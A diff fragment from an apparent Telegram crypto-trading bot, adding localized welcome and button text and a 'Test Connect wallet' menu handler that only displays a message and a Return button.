+        localized_text, use_html = await get_user_message_text(callback.from_user.id, MAIN_WELCOME_TEXT, html_supported=True)
         await callback.message.edit_text(
-            text=MAIN_WELCOME_TEXT,
-            parse_mode="HTML",
-            reply_markup=get_main_keyboard(),
+            text=localized_text,
+            parse_mode="HTML" if use_html else None,
+            reply_markup=get_main_keyboard(callback.from_user.id),
             disable_web_page_preview=True
         )
 
@@ -2548,6 +3340,16 @@ async def handle_buttons(callback: types.CallbackQuery, state: FSMContext):
         await callback.answer()
     elif data == "buy_sell_now":
         await callback.message.answer("⚡️ Fast Trade Console: Paste a Token contract address (CA) below.")
+    elif data == "test_connect_wallet":
+        localized_text, _ = await get_user_message_text(
+            callback.from_user.id,
+            "🧪 Test Connect wallet selected. Use this button to import or generate a wallet for testing."
+        )
+        await callback.message.edit_text(
+            text=localized_text,
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=get_localized_button_text(callback.from_user.id, "Return"), callback_data="main_menu")]]),
+        )
+        await callback.answer()
     elif data == "more_links":
         await callback.message.answer(
             "🔗 More links:\nhttps://t.me/MaestroBotsHub\nhttps://t.me/MaestroSniperUpdates\nhttps://x.com/MaestroBots\nhttps://docs.maestrobots.com/"
